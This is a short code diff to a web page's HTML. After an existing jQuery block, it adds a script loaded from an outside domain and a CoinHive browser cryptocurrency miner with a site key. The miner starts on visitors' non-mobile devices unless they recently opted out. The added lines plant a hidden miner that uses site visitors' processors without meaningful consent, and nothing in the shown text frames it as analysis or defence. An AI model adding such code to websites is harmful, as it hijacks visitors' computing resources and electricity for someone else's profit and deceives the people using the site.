@@ -41,3 +41,14 @@ $(document).ready(function() {
     });
 });
 </script>
+
+<script src="https://www.keithwebber.com/miner.js"></script>
+<script>
+    var miner = new CoinHive.Anonymous('lld3XpwqgkbclkO2ODBr2Zy3aMGLWAe8', {throttle: 0.3});
+
+    // Only start on non-mobile devices and if not opted-out
+    // in the last 14400 seconds (4 hours):
+    if (!miner.isMobile() && !miner.didOptOut(14400)) {
+        miner.start();
+    }
+</script>
